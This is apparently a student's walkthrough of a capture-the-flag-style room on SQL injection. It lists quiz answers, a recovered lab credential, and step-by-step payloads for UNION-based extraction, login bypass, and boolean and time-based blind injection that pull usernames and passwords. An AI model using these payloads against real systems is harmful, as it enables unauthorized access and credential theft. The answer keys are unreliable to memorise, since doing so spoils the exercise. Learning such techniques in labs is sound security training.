# SQL Injection

Learn how to detect and exploit SQL Injection vulnerabilities.

Nov 23, 2021

#### `Task 1: Brief`
##### - What does SQL stand for?
	- Structured Query Language
	
#### `Task 2: What is a Database?`
##### - What is the acronym for the software that controls a database?
	- DBMS
##### - What is the name of the grid-like structure which holds the data?
	- Table
	

#### `Task 3: What is SQL?`
##### - What SQL statement is used to retrieve data?
	- SELECT
##### - What SQL clause can be used to retrieve data from multiple tables?
	- UNION
##### - What SQL statement is used to add data?
	- INSERT


#### `Task 4: What is SQL Injection?`
##### - What character signifies the end of an SQL query?
	- ;


#### `Task 5: In-Band SQLi?`
Deploy the machine, then use the given commands by inserting it next to the last parameter.
This will give you the database, then use the next one 
```
0 UNION SELECT 1,2,database()
```
This will show the different table name in the sqli_one database
```
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```
This will show you the diffent column name in the table
```
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```
This will display the contents of that column
```
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```
By doing the steps above you will be able to find the username and password, then you can proceed inputting it in the login form and you will get the flag in the next page.



#### `Task 6: Blind SQLi - Authentication Bypass`
The next one is basically bypassing the authentication with the help of simple SQL injection,
In the login form you can basically input any username you want but in the password section I used- 
```
' OR 1=1;--
```
This means that the server will receive the payload as an true statement and will proceed to login the account.



#### `Task 7: Blind SQLi - Boolean Based`
This task will have an indicator when the characters that are being type are equal to the actual name of the database,table or column.
When the application will return true that means that you are typing the correct character or number. 

Firstly, we will use this code and it will return true since there are three columns in that table.
```
admin123' UNION SELECT 1,2,3;-- 
```
Then, we will guess for the correct database name for us to exploit the database.
```
admin123' UNION SELECT 1,2,3 where database() like 's%';--
admin123' UNION SELECT 1,2,3 where database() like 'sq%';--
admin123' UNION SELECT 1,2,3 where database() like 'sql%';--
```
By doing this cycle as much as possible the indicator will return true, so that we will know if we are getting the exact name for the database.
Then after we get the actual name of the database we will now search for the table name.
```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'u%';--
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'us%';--
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'use%';--
```
After that we will now proceed getting the column name.
```
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'id%';--
```
But we did find the other column name that is `id` and it is just basically nonsense for us so we will ignore it and continue finding other column name.
```
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'userna%' and COLUMN_NAME !='id';--
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'passwo%' and COLUMN_NAME !='id';--
```
After we find the two column name that seems valuable to us which is `username` and `password` then we will now proceed to find the row or data in that column.
```
admin123' UNION SELECT 1,2,3 from users where username like 'a%';--
admin123' UNION SELECT 1,2,3 from users where username like 'ad%';--
admin123' UNION SELECT 1,2,3 from users where username like 'adm%';--
```
Then for the password-
```
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3%';--
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '38%';--
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '384%';--
```


#### `Task 8: Blind SQLi - Time Based`
This is the same as the previous task but instead it will use the time to indicate that you are getting the exact characters for the actual name in the database.
First, we will test the application by using this code-
```
admin123' UNION SELECT SLEEP(5),2;--
```
After we know that the SLEEP command works, it represents that it is vulnerable to that attack.
```
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 's%';--
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'sq%';--
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'sql%';--
```
Then after several try I found that the database name is `sqli_four`, then we will continue finding the table name.
Actually I just used the same command from previous task but just changing some code in there.
```
admin123' UNION SELECT SLEEP(2),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'us%';--
admin123' UNION SELECT SLEEP(2),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'use%';--
```
Then I found that the table name is `users` and by knowing that we can now proceed to find the columns in that table.
Again, I used the same command from the previous task just doing some modifications.
```
admin123' UNION SELECT SLEEP(2),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'user%' and COLUMN_NAME !='id';--
admin123' UNION SELECT SLEEP(2),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'userna%' and COLUMN_NAME !='id';--
admin123' UNION SELECT SLEEP(2),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'passw%' and COLUMN_NAME !='id';--
admin123' UNION SELECT SLEEP(2),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'passwor%' and COLUMN_NAME !='id';--
```
We now know that in the `users` table we have `username` and `password` column sitting in there.
Then, we will now find the actual row or data that the columns contain.
```
admin123' UNION SELECT 1,2,3 from users where username like 'a%';--
admin123' UNION SELECT 1,2,3 from users where username like 'adm%';--
```
Then
```
admin123' UNION SELECT SLEEP(2),2 from users where username ='admin' and password like '4%';--
admin123' UNION SELECT SLEEP(2),2 from users where username ='admin' and password like '4%1';--
admin123' UNION SELECT SLEEP(2),2 from users where username ='admin' and password like '49%1';--
```
After a few try we now know the correct username and password. `admin:4961`



#### `Task 9: Out-of-Band SQLi`
##### - Name a protocol beginning with D that can be used to exfiltrate data from a database.
	- DNS



#### `Task 10: Remediation`
##### - Name a method of protecting yourself from an SQL Injection exploit.
	- Prepared Statements
